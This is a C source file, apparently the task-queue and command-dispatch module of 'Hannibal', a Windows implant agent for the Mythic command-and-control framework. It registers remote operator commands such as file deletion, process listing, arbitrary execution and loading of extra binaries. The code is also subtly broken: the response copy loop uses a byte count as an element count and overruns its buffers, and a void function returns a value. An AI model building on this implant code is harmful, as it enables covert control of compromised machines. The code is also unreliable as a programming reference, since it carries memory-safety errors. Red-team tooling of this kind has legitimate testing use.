#include "hannibal_tasking.h"


/**
 * @brief Helper function to submit a response into the task_response queue
 *
 * @param[in] message A pointer to the wide-character string containing the message
 *                    to be submitted as the response.
 * @param[in] task_uuid A pointer to a string containing the unique task identifier
 *                      to associate with the response. The memory for this UUID
 *                      is managed elsewhere (freed in `mythic_http_post_tasks()`).
 *
 * @return void
 */
SECTION_CODE void hannibal_response(LPCWSTR message, LPCSTR task_uuid)
{
    HANNIBAL_INSTANCE_PTR

    size_t msg_size = pic_strlenW(message)*sizeof(WCHAR) + 2;
    WCHAR *response_content = (WCHAR *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, msg_size);

    for (int i = 0; i < msg_size; i++) {
        response_content[i] = message[i];
    }

    TASK response_t;
    response_t.output = (LPCSTR)response_content;
    response_t.output_size = (pic_strlenW(response_content) + 1) * sizeof(WCHAR);
    response_t.task_uuid = task_uuid; // Freed in mythic_http_post_tasks()

    task_enqueue(hannibal_instance_ptr->tasks.tasks_response_queue, &response_t); 

    return;
}


SECTION_CODE BOOL init_task_queue(TASK_QUEUE *queue_ptr, int capacity)
{
    
    HANNIBAL_INSTANCE_PTR
    
    queue_ptr->capacity = capacity;
    // Doesn't get freed. Queue stays for lifetime of agent
    queue_ptr->queue_ptr = (TASK *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, sizeof(TASK) * queue_ptr->capacity);

    if (queue_ptr->queue_ptr == NULL){
        return FALSE;
    }

    queue_ptr->size = 0;
    queue_ptr->front = 0;
    queue_ptr->rear = -1;
    
    return TRUE;
}

SECTION_CODE BOOL init_task_response_queue(TASK_QUEUE *queue_ptr, int capacity)
{
    
    HANNIBAL_INSTANCE_PTR
    
    queue_ptr->capacity = capacity;
    // Doesn't get freed. Queue stays for lifetime of agent
    queue_ptr->queue_ptr = (TASK *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, sizeof(TASK) * queue_ptr->capacity);

    if (queue_ptr->queue_ptr == NULL){
        return FALSE;
    }

    queue_ptr->size = 0;
    queue_ptr->front = 0;
    queue_ptr->rear = -1;
    
    return TRUE;
}

SECTION_CODE BOOL task_enqueue(TASK_QUEUE *queue_struct, TASK *TASK)
{
    if (queue_struct->size == queue_struct->capacity){
        return FALSE;
    }

    queue_struct->rear = (queue_struct->rear + 1) % queue_struct->capacity; // Ensure wrap-around
    queue_struct->queue_ptr[queue_struct->rear] = *TASK;
    queue_struct->size++;    
    return TRUE;

}

SECTION_CODE BOOL task_dequeue(TASK_QUEUE *queue_struct, TASK *TASK)
{

    HANNIBAL_INSTANCE_PTR

    if (queue_struct->size == 0){
        return FALSE;
    }

    *TASK = queue_struct->queue_ptr[queue_struct->front];

    queue_struct->front = (queue_struct->front + 1) % queue_struct->capacity;
    queue_struct->size--;

    return TRUE;
}

/**
 * @brief This initializes all the pointers to the commands compiled into the agent.
 * @return void
 */
SECTION_CODE void init_task_ptrs()
{
    HANNIBAL_INSTANCE_PTR

    // Add your new cmd here and the other declarations in hannibal_tasking.h + your profile header
    TASK_ENTRY task_ptrs[] = {
#ifdef INCLUDE_CMD_LS
        {.cmd_id = CMD_LS_MESSAGE, .cmd_ptr = FUNC_OFFSET(cmd_ls)},    
#endif
#ifdef INCLUDE_CMD_EXIT
        {.cmd_id = CMD_EXIT_MESSAGE, .cmd_ptr = FUNC_OFFSET(cmd_exit)},    
#endif
#ifdef INCLUDE_CMD_EXECUTE_HBIN
        {.cmd_id = CMD_EXECUTE_HBIN_MESSAGE, .cmd_ptr = FUNC_OFFSET(cmd_execute_hbin)},    
#endif
#ifdef INCLUDE_CMD_RM
        {.cmd_id = CMD_RM_MESSAGE, .cmd_ptr = FUNC_OFFSET(cmd_rm)},    
#endif
#ifdef INCLUDE_CMD_PWD
        {.cmd_id = CMD_PWD_MESSAGE, .cmd_ptr = FUNC_OFFSET(cmd_pwd)},    
#endif
#ifdef INCLUDE_CMD_CD
        {.cmd_id = CMD_CD_MESSAGE, .cmd_ptr = FUNC_OFFSET(cmd_cd)},    
#endif
#ifdef INCLUDE_CMD_CP
        {.cmd_id = CMD_CP_MESSAGE, .cmd_ptr = FUNC_OFFSET(cmd_cp)},    
#endif
#ifdef INCLUDE_CMD_MV
        {.cmd_id = CMD_MV_MESSAGE, .cmd_ptr = FUNC_OFFSET(cmd_mv)},    
#endif
#ifdef INCLUDE_CMD_HOSTNAME
        {.cmd_id = CMD_HOSTNAME_MESSAGE, .cmd_ptr = FUNC_OFFSET(cmd_hostname)},    
#endif
#ifdef INCLUDE_CMD_WHOAMI
        {.cmd_id = CMD_WHOAMI_MESSAGE, .cmd_ptr = FUNC_OFFSET(cmd_whoami)},    
#endif
#ifdef INCLUDE_CMD_MKDIR
        {.cmd_id = CMD_MKDIR_MESSAGE, .cmd_ptr = FUNC_OFFSET(cmd_mkdir)},    
#endif
#ifdef INCLUDE_CMD_PS
        {.cmd_id = CMD_PS_MESSAGE, .cmd_ptr = FUNC_OFFSET(cmd_ps)},    
#endif
#ifdef INCLUDE_CMD_IPINFO
        {.cmd_id = CMD_IPINFO_MESSAGE, .cmd_ptr = FUNC_OFFSET(cmd_ipinfo)},    
#endif
#ifdef INCLUDE_CMD_LISTDRIVES
        {.cmd_id = CMD_LISTDRIVES_MESSAGE, .cmd_ptr = FUNC_OFFSET(cmd_listdrives)},    
#endif
#ifdef INCLUDE_CMD_EXECUTE
        {.cmd_id = CMD_EXECUTE_MESSAGE, .cmd_ptr = FUNC_OFFSET(cmd_execute)},    
#endif
#ifdef INCLUDE_CMD_SLEEP
        {.cmd_id = CMD_SLEEP_MESSAGE, .cmd_ptr = FUNC_OFFSET(cmd_sleep)},    
#endif
#ifdef INCLUDE_CMD_AGENTINFO
        {.cmd_id = CMD_AGENTINFO_MESSAGE, .cmd_ptr = FUNC_OFFSET(cmd_agentinfo)},    
#endif
    };

    hannibal_instance_ptr->tasks.task_func_ptrs_size = sizeof(task_ptrs)/sizeof(TASK_ENTRY);
    hannibal_instance_ptr->tasks.task_func_ptrs = (TASK_ENTRY *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, sizeof(task_ptrs)); // Doesn't get freed. Stays for lifetime of agent

     if(hannibal_instance_ptr->tasks.task_func_ptrs == NULL){
        return 1;
    }

    pic_memcpy(hannibal_instance_ptr->tasks.task_func_ptrs, task_ptrs, sizeof(task_ptrs));

}